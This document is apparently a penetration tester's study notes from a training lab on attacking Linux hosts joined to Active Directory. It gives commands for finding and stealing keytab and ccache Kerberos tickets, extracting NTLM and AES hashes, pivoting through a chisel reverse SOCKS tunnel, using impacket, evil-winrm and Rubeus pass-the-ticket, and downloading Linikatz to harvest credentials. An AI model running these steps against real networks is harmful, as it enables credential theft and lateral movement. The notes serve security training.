### Content
- [Identifying Linux and Active Directory Integration](#identifying-linux-and-active-directory-integration)
- [Keytab and ccache files](#keytab-and-ccache-files)
	- [Keytab](#keytab)
		- [Finding Keytab Files](#finding-keytab-files)
		- [Abusing KeyTab Files](#abusing-keytab-files)
	- [ccache](#ccache)
		- [Finding ccache Files](#finding-ccache-files)
		- [Abusing ccache Files](#abusing-ccache-files)
- [Using Linux Attack Tools with Kerberos](#using-linux-attack-tools-with-kerberos)
- [From ccache file to kirbi file](#from-ccache-file-to-kirbi-file)
- [Linikatz](#linikatz)

> [!Notes]
> A Linux machine can be connected to AD. In that case, we could try to find Kerberos tickets to impersonate other users and gain more access to the network, even if it's not connected to AD, it could use Kerberos tickets in scripts or to authenticate to the network.

---
# Identifying Linux and Active Directory Integration

> Read this [blog post](https://web.archive.org/web/20210624040251/https://www.2daygeek.com/how-to-identify-that-the-linux-server-is-integrated-with-active-directory-ad/) for more details.

- realm
	``` bash
	$ realm list
	domain
		type: kerberos
		realm-name: DOMAINNAME
		domain-name: domainName
		configured: kerberos-member
		server-software: active-directory
		client-software: sssd
		required-package: sssd-tools
		required-package: sssd
		required-package: libnss-sss
		required-package: libpam-sss
		required-package: adcli
		required-package: samba-common-bin
		login-formats: %U@domainName
		login-policy: allow-permitted-logins
		permitted-logins: user1@domainName, user2@domainName
		permitted-groups: Linux Admins
	```
- To integrate the Linux server with AD, we need to use either [sssd](https://sssd.io/) or [winbind](https://www.samba.org/samba/docs/current/man-html/winbindd.8.html) or `ldap` service.
	``` bash
	$ ps -ef | grep -i "winbind\|sssd"
	
	# The results if the system is integrated with AD using SSSD service.
	root     29912     1  0  2017 ?        00:19:09 /usr/sbin/sssd -f -D
	root     29913 29912  0  2017 ?        04:36:59 /usr/libexec/sssd/sssd_be --domain 2daygeek.com --uid 0 --gid 0 --debug-to-files
	root     29914 29912  0  2017 ?        00:29:28 /usr/libexec/sssd/sssd_nss --uid 0 --gid 0 --debug-to-files
	root     29915 29912  0  2017 ?        00:09:19 /usr/libexec/sssd/sssd_pam --uid 0 --gid 0 --debug-to-files
	root     31584 26666  0 13:41 pts/3    00:00:00 grep sssd
	
	# The results of if the system is integrated with AD using winbind service.
	root       676 21055  0  2017 ?        00:00:22 **winbindd**
	root       958 21055  0  2017 ?        00:00:35 winbindd
	root     21055     1  0  2017 ?        00:59:07 winbindd
	root     21061 21055  0  2017 ?        11:48:49 winbindd
	root     21062 21055  0  2017 ?        00:01:28 winbindd
	root     21959  4570  0 13:50 pts/2    00:00:00 grep -i winbind\|sssd
	root     27780 21055  0  2017 ?        00:00:21 winbindd
	```
---
# Keytab and ccache files
## Keytab

- A **persistent file** that stores **Kerberos principal names and their long-term encryption keys**.
- Used to authenticate to various remote systems using Kerberos without entering a password.
- To use a keytab file, we must have read and write (rw) privileges on the file.
- See [Keytab](https://kb.iu.edu/d/aumh) for more info.

> A Linux domain joined machine needs a ticket. The ticket is represented as a keytab file located by default at `/etc/krb5.keytab` and can only be read by the root user. If we gain access to this ticket, we can impersonate the computer account.
#### Finding Keytab Files
``` bash
# Search for it in the system by its name
$ find / -name *keytab* -ls 2>/dev/null
# Check the scheduled scripts and review it to see if it's using kinit which allows interaction with kerberos
$ crontab -l
```
#### Abusing KeyTab Files
Impersonating a User with a keytab
``` bash
# Confirm which ticket we are using
$ klist
# Listing keytab file information (ex: principal name and domain name)
$ klist -k -t /opt/specialfiles/user.keytab
# Import the stolen ticket, use the name of the principal as shown in klist because kinit is case sensitive 
$ kinit <principal> -k -t /opt/specialfiles/user.keytab
# Make sure the ticket has changed
$ klist
# log in as another user
$ su - user@admin
```

>**Note:** To keep the ticket from the current session, before importing the keytab, save a copy of the ccache file present in the environment variable `KRB5CCNAME`.

Extracting Keytab Hashes with [KeyTabExtract](https://github.com/sosdave/KeyTabExtract)
``` bash
$ python3 keytabextract.py user.keytab

[*] RC4-HMAC Encryption detected. Will attempt to extract NTLM hash.
[*] AES256-CTS-HMAC-SHA1 key found. Will attempt hash extraction.
[*] AES128-CTS-HMAC-SHA1 hash discovered. Will attempt hash extraction.
[+] Keytab File successfully imported.
        REALM : domain
        SERVICE PRINCIPAL : user/
        NTLM HASH : <>
        AES-256 HASH : <>
        AES-128 HASH : <>
```

> With the NTLM hash, we can perform a Pass the Hash attack. With the AES256 or AES128 hash, we can forge our tickets using Rubeus or attempt to crack the hashes to obtain the plaintext password.
> 
> Use hashcat or john to crack NTLM or use [crackstation](https://crackstation.net/)

## ccache
- A **temporary storage** that holds **Kerberos tickets** (TGT and TGS) after a user authenticates.
- Stored in files like `/tmp/krb5cc_*` on Linux. 
- Can be **exported and imported** (e.g., `klist`, `kinit`).
- The current ticket is stored in the environment variable `KRB5CCNAME`.
- **Accessing and abusing ccache files can only be done by elevated privileges.**
- See [ccache files](https://web.mit.edu/kerberos/krb5-1.12/doc/basic/ccache_def.html) for more info.
#### Finding ccache Files
``` bash
# Reviewing Environment Variables for ccache Files.
$ env | grep -i krb5
# Searching for ccache Files in /tmp
$ ls -la /tmp
```
#### Abusing ccache Files
``` bash
# Confirm which ticket we are using
$ klist
# Importing the ccache File into our Current Session
$ cp /tmp/krb5cc_647401106_I8I133 .
$ export KRB5CCNAME=/root/krb5cc_647401106_I8I133
$ klist
Ticket cache: FILE:/root/krb5cc_647401106_I8I133
Default principal: julio@INLANEFREIGHT.HTB

Valid starting       Expires              Service principal
10/07/2022 13:25:01  10/07/2022 23:25:01  krbtgt/INLANEFREIGHT.HTB@INLANEFREIGHT.HTB
        renew until 10/08/2022 13:25:01
```
---
# Using Linux Attack Tools with Kerberos

> Most Linux attack tools that interact with Windows and Active Directory support Kerberos authentication. If we use them from a domain-joined machine, we need to ensure our `KRB5CCNAME` environment variable is set to the ccache file we want to use.
> 
> In case we are attacking from a machine that is not a member of the domain, for example, our attack host, we need to make sure our machine can contact the KDC or Domain Controller, and that domain name resolution is working.

**Scenario**
- We can't connect directly to a DC/KDC and we can't use a DC for name resolution.
- We have connection to AD machine `MS01`

How will we connect ?
Use [Chisel](https://github.com/jpillora/chisel) and [Proxychains](https://github.com/haad/proxychains) and edit the `/etc/hosts` file to hardcode IP addresses of the domain and the machines we want to attack.

1. Edit /etc/hosts
	``` bash
	$ cat /etc/hosts
	
	# Host addresses
	
	172.16.1.10 inlanefreight.htb   inlanefreight   dc01.inlanefreight.htb  dc01
	172.16.1.5  ms01.inlanefreight.htb  ms01
	```
2. Edi Proxychains
	``` bash
	$ tail -n 2 /etc/proxychains4.conf
	socks4  127.0.0.1 9050
	```
3. Use chisel
	``` bash
	$ sudo ./chisel server --reverse 
	
	2022/10/10 07:26:15 server: Listening on http://0.0.0.0:8080
	```
4. Connect to MS01 with xfreerdp and run chisel on the windows machine
	``` bash
	$ xfreerdp /v:10.129.204.23 /u:david /d:inlanefreight.htb /p:Password2 /dynamic-resolution
	```

	``` powershell
	C:\htb> c:\tools\chisel.exe client <attack_host_ip>:8080 R:socks
	```
5. Export the ccache file that we want to impersonate in our attack host
	``` bash
	$ export KRB5CCNAME=krb5cc_644116_I813
	```
6. Use impacket
	``` bash
	# To use the Kerberos ticket, specify target machine name (not the IP address)
	# and use the option -k, use -no-pass if we get a prompt for a password
	$ proxychains impacket-wmiexec dc01 -k
	```
7. Use evil-winrm
	``` bash
	# Install Kerberos Authentication Package
	$ sudo apt-get install krb5-user -y
	# Use the domain name: INLANEFREIGHT.HTB, and the KDC is the DC01
	$ cat /etc/krb5.conf
	
	[libdefaults]
	        default_realm = INLANEFREIGHT.HTB
	
	<SNIP>
	
	[realms]
	    INLANEFREIGHT.HTB = {
	        kdc = dc01.inlanefreight.htb
	    }
	
	<SNIP>
	# Use evil-winrm
	$ proxychains evil-winrm -i dc01 -r inlanefreight.htb
	```

> **Note:** If you are using Impacket tools from a Linux machine connected to the domain, note that some Linux Active Directory implementations use the FILE: prefix in the KRB5CCNAME variable. If this is the case, we need to modify the variable only to include the path to the ccache file.

---
##### From ccache file to kirbi file 
If we want to use a `ccache file` in Windows or a `kirbi file` in a Linux machine, we can use [impacket-ticketConverter](https://github.com/SecureAuthCorp/impacket/blob/master/examples/ticketConverter.py) to convert them.
``` bash
# from ccache to kirbi
$ impacket-ticketConverter krb5cc_647401106_I8I133 user0.kirbi
# from kirbi to ccache
$ impacket-ticketConverter user.kirbi krb5cc_647401106_I8I133
```
The you can use the kirbi file with rubeus
``` cmd 
C:\> Rubeus.exe ptt /ticket:c:\tools\user0.kirbi
C:\> dir \\dc01\user0
```
---
## Linikatz

[Linikatz](https://github.com/CiscoCXSecurity/linikatz) will extract all credentials, including Kerberos tickets, from different Kerberos implementations.

``` bash
$ wget https://raw.githubusercontent.com/CiscoCXSecurity/linikatz/master/linikatz.sh
$ /opt/linikatz.sh
```